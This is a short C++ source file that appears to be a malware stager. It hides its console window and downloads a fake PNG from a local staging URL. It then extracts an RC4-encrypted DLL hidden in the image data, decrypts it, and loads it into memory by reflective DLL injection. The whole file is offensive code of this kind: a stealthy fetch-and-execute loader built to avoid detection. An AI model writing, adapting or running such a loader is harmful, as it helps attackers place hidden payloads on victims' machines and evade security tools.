#include <iostream>
#include <fstream>
#include <vector>
#include "utils.h"
#include "rdi.h"




int main() {

	FreeConsole();
	
	// get the content of the dll from Internet. 
	PIC_WSTRING(host, L"http://127.0.0.1:8000/tst.png");
	PIC_WSTRING(useragent, L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0");
	auto downloadedFile = FetchFileContents(host, useragent);
	if (downloadedFile.data() == NULL) {
		return 1;
	}
	
	auto encrypted_DLLcontent = ReadPngIdat(downloadedFile);

	// RC4 SystemFunction033
	auto DLLcontent = DecryptStream(encrypted_DLLcontent);

	ReflectiveDLLInjection(&DLLcontent);

	return 0;
}
